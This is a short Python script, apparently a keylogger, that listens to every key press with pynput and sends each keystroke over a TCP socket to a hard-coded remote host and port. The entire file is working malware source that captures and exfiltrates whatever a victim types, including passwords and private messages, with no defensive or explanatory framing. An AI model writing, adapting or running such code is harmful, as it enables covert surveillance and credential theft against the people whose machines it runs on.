#!/usr/bin/env python
import pynput.keyboard
import socket

s = socket.socket()
port = 8082

host = "192.168.71.136"

s.connect((host, port))
print("********-----connnected to server--------*******")

log = ""

def process_key(key):
    global log
    log = str(key)
    s.send(log.encode())


Listener = pynput.keyboard.Listener(on_press=process_key)

with Listener:
    Listener.join()




